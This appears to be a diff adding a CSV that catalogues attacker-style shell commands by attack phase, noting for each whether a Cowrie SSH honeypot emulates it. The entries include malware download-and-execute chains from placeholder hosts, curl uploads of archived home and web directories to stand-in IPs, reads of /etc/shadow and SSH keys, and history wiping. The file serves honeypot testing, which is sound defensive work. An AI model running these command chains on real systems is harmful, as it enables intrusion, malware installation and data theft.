@@ -1,0 +1,222 @@
+category,command,class,evidence,observed_output_chars
+benign,cat /etc/apt/sources.list,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+benign,cat /etc/os-release,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+benign,clear,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+benign,curl -I http://files.example/,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+benign,curl -I http://mirror.example/,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+benign,curl -I http://pkg-repo.example/,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+benign,date,confirmed_returns,observed prompt return (tasks 7/9/10A),50.0
+benign,df -h,confirmed_returns,observed prompt return (tasks 7/9/10A),612
+benign,du -sh /var/log,confirmed_returns,observed prompt return (tasks 7/9/10A),42.0
+benign,free -m,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+benign,hostname,expected_returns,implemented in Cowrie source; not yet observed,
+benign,id,confirmed_returns,observed prompt return (tasks 7/9/10A),67.0
+benign,journalctl -n 20,unsupported_command_not_found,"not implemented: ['journalctl'] -> 'command not found', returns",
+benign,ls,confirmed_returns,observed prompt return (tasks 7/9/10A),17
+benign,ls -la /var/log | tail -n 5,expected_returns,implemented in Cowrie source; not yet observed,
+benign,ps aux,confirmed_returns,observed prompt return (tasks 7/9/10A),6258
+benign,ps aux | grep sshd,expected_returns,implemented in Cowrie source; not yet observed,
+benign,pwd,confirmed_returns,observed prompt return (tasks 7/9/10A),33.0
+benign,service cron status,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+benign,service ssh status,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+benign,systemctl status ssh,confirmed_returns,observed prompt return (tasks 7/9/10A),73
+benign,tail -n 50 /var/log/syslog,confirmed_returns,observed prompt return (tasks 7/9/10A),43.0
+benign,uname -r,confirmed_returns,observed prompt return (tasks 7/9/10A),37
+benign,uptime,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+benign,w,confirmed_returns,observed prompt return (tasks 7/9/10A),215.0
+benign,who,confirmed_returns,observed prompt return (tasks 7/9/10A),72
+reconnaissance,cat /etc/group,confirmed_returns,observed prompt return (tasks 7/9/10A),567
+reconnaissance,cat /etc/issue,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+reconnaissance,cat /etc/os-release,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+reconnaissance,cat /etc/passwd,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+reconnaissance,cat /etc/passwd | grep sh,expected_returns,implemented in Cowrie source; not yet observed,
+reconnaissance,cat /etc/resolv.conf,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+reconnaissance,cat /proc/version,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+reconnaissance,curl -s http://files.example/ip,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+reconnaissance,curl -s http://mirror.example/ip,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+reconnaissance,curl -s http://pkg-repo.example/ip,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+reconnaissance,df -h,confirmed_returns,observed prompt return (tasks 7/9/10A),612
+reconnaissance,free -m,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+reconnaissance,groups,expected_returns,implemented in Cowrie source; not yet observed,
+reconnaissance,hostname,expected_returns,implemented in Cowrie source; not yet observed,
+reconnaissance,id,confirmed_returns,observed prompt return (tasks 7/9/10A),67.0
+reconnaissance,ifconfig,confirmed_returns,observed prompt return (tasks 7/9/10A),926
+reconnaissance,ip a,unsupported_command_not_found,"not implemented: ['ip'] -> 'command not found', returns",
+reconnaissance,ip route,unsupported_command_not_found,"not implemented: ['ip'] -> 'command not found', returns",
+reconnaissance,ls,confirmed_returns,observed prompt return (tasks 7/9/10A),17
+reconnaissance,ls -la,confirmed_returns,observed prompt return (tasks 7/9/10A),117
+reconnaissance,lscpu,confirmed_returns,observed prompt return (tasks 7/9/10A),617
+reconnaissance,netstat -antp,expected_returns,implemented in Cowrie source; not yet observed,
+reconnaissance,nproc,static_output,txtcmd: ['nproc'],
+reconnaissance,ps aux,confirmed_returns,observed prompt return (tasks 7/9/10A),6258
+reconnaissance,pwd,confirmed_returns,observed prompt return (tasks 7/9/10A),33.0
+reconnaissance,ss -tulpn,unsupported_command_not_found,"not implemented: ['ss'] -> 'command not found', returns",
+reconnaissance,uname -a,confirmed_returns,observed prompt return (tasks 7/9/10A),96
+reconnaissance,uname -r,confirmed_returns,observed prompt return (tasks 7/9/10A),37
+reconnaissance,w,confirmed_returns,observed prompt return (tasks 7/9/10A),215.0
+reconnaissance,wget -qO- http://files.example/ip,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+reconnaissance,wget -qO- http://mirror.example/ip,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+reconnaissance,wget -qO- http://pkg-repo.example/ip,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+reconnaissance,whoami,confirmed_returns,observed prompt return (tasks 7/9/10A),30.0
+brute_force,echo ok,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+brute_force,uname -a,confirmed_returns,observed prompt return (tasks 7/9/10A),96
+brute_force,whoami,confirmed_returns,observed prompt return (tasks 7/9/10A),30.0
+botnet,./b.sh,confirmed_returns,observed prompt return (tasks 7/9/10A),62
+botnet,./malware.sh,confirmed_returns,observed prompt return (tasks 7/9/10A),70
+botnet,./payload,expected_returns,implemented in Cowrie source; not yet observed,
+botnet,./update.sh,expected_returns,implemented in Cowrie source; not yet observed,
+botnet,cat /proc/cpuinfo,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+botnet,cd /dev/shm,confirmed_returns,observed prompt return (tasks 7/9/10A),34
+botnet,cd /tmp,confirmed_returns,observed prompt return (tasks 7/9/10A),26
+botnet,cd /tmp || cd /var/tmp,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+botnet,cd /var/tmp,confirmed_returns,observed prompt return (tasks 7/9/10A),34
+botnet,chmod +x b.sh,confirmed_returns,observed prompt return (tasks 7/9/10A),91
+botnet,chmod +x malware.sh,expected_returns,implemented in Cowrie source; not yet observed,
+botnet,chmod +x payload,confirmed_returns,observed prompt return (tasks 7/9/10A),97
+botnet,chmod +x update.sh,expected_returns,implemented in Cowrie source; not yet observed,
+botnet,chmod 777 b.sh,expected_returns,implemented in Cowrie source; not yet observed,
+botnet,chmod 777 malware.sh,confirmed_returns,observed prompt return (tasks 7/9/10A),100
+botnet,chmod 777 payload,expected_returns,implemented in Cowrie source; not yet observed,
+botnet,chmod 777 update.sh,expected_returns,implemented in Cowrie source; not yet observed,
+botnet,curl -O http://files.example/b.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,curl -O http://files.example/malware.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,curl -O http://files.example/payload,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,curl -O http://files.example/update.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,curl -O http://mirror.example/b.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,curl -O http://mirror.example/malware.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,curl -O http://mirror.example/payload,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,curl -O http://mirror.example/update.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,curl -O http://pkg-repo.example/b.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,curl -O http://pkg-repo.example/malware.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,curl -O http://pkg-repo.example/payload,network_dependent_fails_in_isolation,observed prompt return,113
+botnet,curl -O http://pkg-repo.example/update.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,enable,static_output,txtcmd: ['enable'],
+botnet,history -c,expected_returns,implemented in Cowrie source; not yet observed,
+botnet,id,confirmed_returns,observed prompt return (tasks 7/9/10A),67.0
+botnet,rm -rf b.sh,confirmed_returns,observed prompt return (tasks 7/9/10A),34
+botnet,rm -rf malware.sh,expected_returns,implemented in Cowrie source; not yet observed,
+botnet,rm -rf payload,expected_returns,implemented in Cowrie source; not yet observed,
+botnet,rm -rf update.sh,expected_returns,implemented in Cowrie source; not yet observed,
+botnet,rm b.sh,expected_returns,implemented in Cowrie source; not yet observed,
+botnet,rm malware.sh,expected_returns,implemented in Cowrie source; not yet observed,
+botnet,rm payload,expected_returns,implemented in Cowrie source; not yet observed,
+botnet,rm update.sh,expected_returns,implemented in Cowrie source; not yet observed,
+botnet,sh b.sh,expected_returns,implemented in Cowrie source; not yet observed,
+botnet,sh malware.sh,expected_returns,implemented in Cowrie source; not yet observed,
+botnet,sh payload,confirmed_returns,observed prompt return (tasks 7/9/10A),74
+botnet,sh update.sh,expected_returns,implemented in Cowrie source; not yet observed,
+botnet,shell,confirmed_returns,observed prompt return (tasks 7/9/10A),54.5
+botnet,system,confirmed_returns,observed prompt return (tasks 7/9/10A),62
+botnet,uname -a,confirmed_returns,observed prompt return (tasks 7/9/10A),96
+botnet,uname -m,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+botnet,unset HISTFILE,expected_returns,implemented in Cowrie source; not yet observed,
+botnet,w,confirmed_returns,observed prompt return (tasks 7/9/10A),215.0
+botnet,wget -q http://files.example/b.sh -O b.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,wget -q http://files.example/malware.sh -O malware.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,wget -q http://files.example/payload -O payload,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,wget -q http://files.example/update.sh -O update.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,wget -q http://mirror.example/b.sh -O b.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,wget -q http://mirror.example/malware.sh -O malware.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,wget -q http://mirror.example/payload -O payload,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,wget -q http://mirror.example/update.sh -O update.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,wget -q http://pkg-repo.example/b.sh -O b.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,wget -q http://pkg-repo.example/malware.sh -O malware.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,wget -q http://pkg-repo.example/payload -O payload,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,wget -q http://pkg-repo.example/update.sh -O update.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,wget http://files.example/b.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,wget http://files.example/malware.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,wget http://files.example/payload,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,wget http://files.example/update.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,wget http://mirror.example/b.sh,network_dependent_fails_in_isolation,observed prompt return,251
+botnet,wget http://mirror.example/malware.sh,network_dependent_fails_in_isolation,observed prompt return,259
+botnet,wget http://mirror.example/payload,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,wget http://mirror.example/update.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,wget http://pkg-repo.example/b.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,wget http://pkg-repo.example/malware.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,wget http://pkg-repo.example/payload,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+botnet,wget http://pkg-repo.example/update.sh,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+privilege_escalation,cat /etc/crontab,confirmed_returns,observed prompt return (tasks 7/9/10A),32
+privilege_escalation,cat /etc/shadow,confirmed_returns,observed prompt return (tasks 7/9/10A),781
+privilege_escalation,cat /etc/sudoers,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+privilege_escalation,cat /proc/version,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+privilege_escalation,crontab -l,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+privilege_escalation,find / -name id_rsa 2>/dev/null,confirmed_returns,observed prompt return (tasks 7/9/10A),50
+privilege_escalation,find / -perm -4000 -type f 2>/dev/null,confirmed_returns,observed prompt return (tasks 7/9/10A),55.5
+privilege_escalation,find / -perm -u=s -type f 2>/dev/null,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+privilege_escalation,groups,expected_returns,implemented in Cowrie source; not yet observed,
+privilege_escalation,id,confirmed_returns,observed prompt return (tasks 7/9/10A),67.0
+privilege_escalation,ls -la,confirmed_returns,observed prompt return (tasks 7/9/10A),117
+privilege_escalation,ls -la /etc/cron.d,expected_returns,implemented in Cowrie source; not yet observed,
+privilege_escalation,ls -la /etc/passwd,expected_returns,implemented in Cowrie source; not yet observed,
+privilege_escalation,ls -la /etc/shadow,expected_returns,implemented in Cowrie source; not yet observed,
+privilege_escalation,ls -la /root/.ssh,expected_returns,implemented in Cowrie source; not yet observed,
+privilege_escalation,ls -la /usr/bin | grep rws,expected_returns,implemented in Cowrie source; not yet observed,
+privilege_escalation,ls -la ~/.ssh,confirmed_returns,observed prompt return (tasks 7/9/10A),91
+privilege_escalation,pwd,confirmed_returns,observed prompt return (tasks 7/9/10A),33.0
+privilege_escalation,sudo -l,confirmed_returns,observed prompt return (tasks 7/9/10A),681.5
+privilege_escalation,uname -r,confirmed_returns,observed prompt return (tasks 7/9/10A),37
+privilege_escalation,w,confirmed_returns,observed prompt return (tasks 7/9/10A),215.0
+privilege_escalation,whoami,confirmed_returns,observed prompt return (tasks 7/9/10A),30.0
+lateral_movement,arp -a,confirmed_returns,observed prompt return (tasks 7/9/10A),52
+lateral_movement,cat /etc/hosts,confirmed_returns,observed prompt return (tasks 7/9/10A),219
+lateral_movement,cat /etc/hosts | grep -v '^#',expected_returns,implemented in Cowrie source; not yet observed,
+lateral_movement,cat ~/.bash_history,confirmed_returns,observed prompt return (tasks 7/9/10A),83
+lateral_movement,cat ~/.bash_history | grep ssh,expected_returns,implemented in Cowrie source; not yet observed,
+lateral_movement,cat ~/.ssh/config,confirmed_returns,observed prompt return (tasks 7/9/10A),84
+lateral_movement,cat ~/.ssh/known_hosts,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+lateral_movement,hostname,expected_returns,implemented in Cowrie source; not yet observed,
+lateral_movement,id,confirmed_returns,observed prompt return (tasks 7/9/10A),67.0
+lateral_movement,ip route,unsupported_command_not_found,"not implemented: ['ip'] -> 'command not found', returns",
+lateral_movement,ls -la ~/.ssh,confirmed_returns,observed prompt return (tasks 7/9/10A),91
+lateral_movement,nc -zv 192.0.2.12 22,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+lateral_movement,nc -zv 192.0.2.5 22,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+lateral_movement,nc -zv 198.51.100.10 22,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+lateral_movement,nc -zv 203.0.113.8 22,network_dependent_fails_in_isolation,"source: handled failure path, exits",
+lateral_movement,netstat -antp,expected_returns,implemented in Cowrie source; not yet observed,
+lateral_movement,nmap -sn 192.0.2.0/24,unsupported_command_not_found,"not implemented: ['nmap'] -> 'command not found', returns",
+lateral_movement,ping -c 2 192.0.2.12,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+lateral_movement,ping -c 2 192.0.2.5,confirmed_returns,observed prompt return (tasks 7/9/10A),76
+lateral_movement,ping -c 2 198.51.100.10,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+lateral_movement,ping -c 2 203.0.113.8,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+lateral_movement,ss -tan,unsupported_command_not_found,"not implemented: ['ss'] -> 'command not found', returns",
+lateral_movement,w,confirmed_returns,observed prompt return (tasks 7/9/10A),215.0
+lateral_movement,whoami,confirmed_returns,observed prompt return (tasks 7/9/10A),30.0
+exfiltration,curl -T /dev/shm/d.tgz http://192.0.2.10/u,network_dependent_fails_in_isolation,"observed prompt return; Cowrie curl has no -T option (getopt 'Lsho:IO'): option error, no upload emulated",154
+exfiltration,curl -T /dev/shm/d.tgz http://192.0.2.40/u,network_dependent_fails_in_isolation,"source: handled failure path, exits; Cowrie curl has no -T option (getopt 'Lsho:IO'): option error, no upload emulated",
+exfiltration,curl -T /dev/shm/d.tgz http://198.51.100.20/u,network_dependent_fails_in_isolation,"source: handled failure path, exits; Cowrie curl has no -T option (getopt 'Lsho:IO'): option error, no upload emulated",
+exfiltration,curl -T /dev/shm/d.tgz http://203.0.113.30/u,network_dependent_fails_in_isolation,"source: handled failure path, exits; Cowrie curl has no -T option (getopt 'Lsho:IO'): option error, no upload emulated",
+exfiltration,curl -T /dev/shm/d.tgz http://files.example/u,network_dependent_fails_in_isolation,"source: handled failure path, exits; Cowrie curl has no -T option (getopt 'Lsho:IO'): option error, no upload emulated",
+exfiltration,curl -T /dev/shm/d.tgz http://mirror.example/u,network_dependent_fails_in_isolation,"source: handled failure path, exits; Cowrie curl has no -T option (getopt 'Lsho:IO'): option error, no upload emulated",
+exfiltration,curl -T /dev/shm/d.tgz http://pkg-repo.example/u,network_dependent_fails_in_isolation,"source: handled failure path, exits; Cowrie curl has no -T option (getopt 'Lsho:IO'): option error, no upload emulated",
+exfiltration,curl -T /tmp/d.tgz http://192.0.2.10/u,network_dependent_fails_in_isolation,"source: handled failure path, exits; Cowrie curl has no -T option (getopt 'Lsho:IO'): option error, no upload emulated",
+exfiltration,curl -T /tmp/d.tgz http://192.0.2.40/u,network_dependent_fails_in_isolation,"source: handled failure path, exits; Cowrie curl has no -T option (getopt 'Lsho:IO'): option error, no upload emulated",
+exfiltration,curl -T /tmp/d.tgz http://198.51.100.20/u,network_dependent_fails_in_isolation,"source: handled failure path, exits; Cowrie curl has no -T option (getopt 'Lsho:IO'): option error, no upload emulated",
+exfiltration,curl -T /tmp/d.tgz http://203.0.113.30/u,network_dependent_fails_in_isolation,"source: handled failure path, exits; Cowrie curl has no -T option (getopt 'Lsho:IO'): option error, no upload emulated",
+exfiltration,curl -T /tmp/d.tgz http://files.example/u,network_dependent_fails_in_isolation,"source: handled failure path, exits; Cowrie curl has no -T option (getopt 'Lsho:IO'): option error, no upload emulated",
+exfiltration,curl -T /tmp/d.tgz http://mirror.example/u,network_dependent_fails_in_isolation,"source: handled failure path, exits; Cowrie curl has no -T option (getopt 'Lsho:IO'): option error, no upload emulated",
+exfiltration,curl -T /tmp/d.tgz http://pkg-repo.example/u,network_dependent_fails_in_isolation,"source: handled failure path, exits; Cowrie curl has no -T option (getopt 'Lsho:IO'): option error, no upload emulated",
+exfiltration,curl -T /var/tmp/d.tgz http://192.0.2.10/u,network_dependent_fails_in_isolation,"observed prompt return; Cowrie curl has no -T option (getopt 'Lsho:IO'): option error, no upload emulated",152
+exfiltration,curl -T /var/tmp/d.tgz http://192.0.2.40/u,network_dependent_fails_in_isolation,"source: handled failure path, exits; Cowrie curl has no -T option (getopt 'Lsho:IO'): option error, no upload emulated",
+exfiltration,curl -T /var/tmp/d.tgz http://198.51.100.20/u,network_dependent_fails_in_isolation,"source: handled failure path, exits; Cowrie curl has no -T option (getopt 'Lsho:IO'): option error, no upload emulated",
+exfiltration,curl -T /var/tmp/d.tgz http://203.0.113.30/u,network_dependent_fails_in_isolation,"source: handled failure path, exits; Cowrie curl has no -T option (getopt 'Lsho:IO'): option error, no upload emulated",
+exfiltration,curl -T /var/tmp/d.tgz http://files.example/u,network_dependent_fails_in_isolation,"source: handled failure path, exits; Cowrie curl has no -T option (getopt 'Lsho:IO'): option error, no upload emulated",
+exfiltration,curl -T /var/tmp/d.tgz http://mirror.example/u,network_dependent_fails_in_isolation,"source: handled failure path, exits; Cowrie curl has no -T option (getopt 'Lsho:IO'): option error, no upload emulated",
+exfiltration,curl -T /var/tmp/d.tgz http://pkg-repo.example/u,network_dependent_fails_in_isolation,"source: handled failure path, exits; Cowrie curl has no -T option (getopt 'Lsho:IO'): option error, no upload emulated",
+exfiltration,df -h,confirmed_returns,observed prompt return (tasks 7/9/10A),612
+exfiltration,du -sh /home /var/www,confirmed_returns,observed prompt return (tasks 7/9/10A),46
+exfiltration,find / -name '*.sql' 2>/dev/null,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+exfiltration,find /home -name '*.db' 2>/dev/null,confirmed_returns,observed prompt return (tasks 7/9/10A),51.0
+exfiltration,id,confirmed_returns,observed prompt return (tasks 7/9/10A),67.0
+exfiltration,ls,confirmed_returns,observed prompt return (tasks 7/9/10A),17
+exfiltration,ls -la /home,expected_returns,implemented in Cowrie source; not yet observed,
+exfiltration,ls -la /var/backups,expected_returns,implemented in Cowrie source; not yet observed,
+exfiltration,rm -f /dev/shm/d.tgz /dev/shm/d.tar,confirmed_returns,observed prompt return (tasks 7/9/10A),52
+exfiltration,rm -f /tmp/d.tgz /tmp/d.tar,expected_returns,implemented in Cowrie source; not yet observed,
+exfiltration,rm -f /var/tmp/d.tgz /var/tmp/d.tar,confirmed_returns,observed prompt return (tasks 7/9/10A),50
+exfiltration,tar cf /dev/shm/d.tar /var/www,confirmed_returns,observed prompt return (tasks 7/9/10A),224
+exfiltration,tar cf /tmp/d.tar /var/www,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+exfiltration,tar cf /var/tmp/d.tar /var/www,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+exfiltration,tar czf /dev/shm/d.tgz /home,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+exfiltration,tar czf /tmp/d.tgz /home,expected_returns,implemented; historically returned (gen 2.0 next-line rate 1.0),
+exfiltration,tar czf /var/tmp/d.tgz /home,confirmed_returns,observed prompt return (tasks 7/9/10A),220
+exfiltration,whoami,confirmed_returns,observed prompt return (tasks 7/9/10A),30.0
